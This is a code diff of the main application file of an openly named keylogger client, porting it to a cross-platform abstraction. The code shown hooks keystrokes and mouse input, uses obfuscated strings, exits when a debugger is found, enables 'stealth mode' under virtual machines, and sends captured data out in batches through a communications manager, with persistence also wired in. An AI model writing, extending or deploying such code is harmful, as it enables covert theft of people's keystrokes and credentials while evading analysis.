@@ -3,17 +3,17 @@
 #include "core/Application.h"
 #include "core/Configuration.h"
 #include "core/Logger.h"
+#include "core/Platform.h"              // Use platform abstraction
 #include "hooks/KeyHook.h"
 #include "hooks/MouseHook.h"
-#include "security/AntiAnalysis.h"  // 新增
-#include "security/Obfuscation.h"   // 新增
+#include "security/AntiAnalysis.h"
+#include "security/Obfuscation.h"
 #include "persistence/PersistenceManager.h"
 #include "communication/CommsManager.h"
 #include "data/DataManager.h"
 #include "utils/SystemUtils.h"
 #include "utils/FileUtils.h"
 #include "utils/TimeUtils.h"
-#include <windows.h>                // 新增
 #include <thread>
 #include <chrono>
 #include <string>
@@ -21,8 +21,8 @@
 #include <cstdint>
 
 // Obfuscated strings
-constexpr auto OBFUSCATED_APP_NAME = OBFUSCATE("KeyloggerClientProject");
-constexpr auto OBFUSCATED_MUTEX_NAME = OBFUSCATE("KLRP_MUTEX_7E3F1A");
+const std::string OBFUSCATED_APP_NAME = OBFUSCATE("KeyloggerClientProject");
+const std::string OBFUSCATED_MUTEX_NAME = OBFUSCATE("KLRP_MUTEX_7E3F1A");
 
 Application::Application() : m_running(false), m_config(nullptr) {
     // Constructor remains the same
@@ -35,7 +35,7 @@ Application::~Application() {
 bool Application::Initialize() {
     // Anti-analysis checks
     if (security::AntiAnalysis::IsDebuggerPresent()) {
-        ExitProcess(0);
+        Platform::ExitProcess(0);
     }
 
     if (security::AntiAnalysis::IsRunningInVM()) {
@@ -43,10 +43,10 @@ bool Application::Initialize() {
         utils::SystemUtils::EnableStealthMode();
     }
 
-    // Singleton instance check
-    HANDLE hMutex = CreateMutexA(nullptr, TRUE, OBFUSCATED_MUTEX_NAME);
-    if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        ExitProcess(0);
+    // Singleton instance check using cross-platform mutex
+    PlatformHandle hMutex = Platform::CreateNamedMutex(OBFUSCATED_MUTEX_NAME.c_str());
+    if (Platform::GetLastError() == PLATFORM_ERROR_ALREADY_EXISTS || hMutex == INVALID_PLATFORM_HANDLE) {
+        Platform::ExitProcess(0);
     }
 
     // Initialize components
@@ -107,7 +107,7 @@ void Application::Run() {
         auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(now - lastBatchTime);
 
         if (elapsed.count() >= 5 && m_dataManager->IsBatchReady()) {
-            auto batchData = m_dataManager->RetrieveEncryptedData(); // 修改的方法名
+            auto batchData = m_dataManager->RetrieveEncryptedData();
 
             if (!batchData.empty()) {
                 if (m_commsManager->TransmitData(batchData)) {
@@ -162,7 +162,7 @@ void Application::Shutdown() {
 
     // Transmit any remaining batch data
     if (m_dataManager->IsBatchReady()) {
-        auto batchData = m_dataManager->RetrieveEncryptedData(); // 修改的方法名
+        auto batchData = m_dataManager->RetrieveEncryptedData();
         if (!batchData.empty()) {
             m_commsManager->TransmitData(batchData);
         }
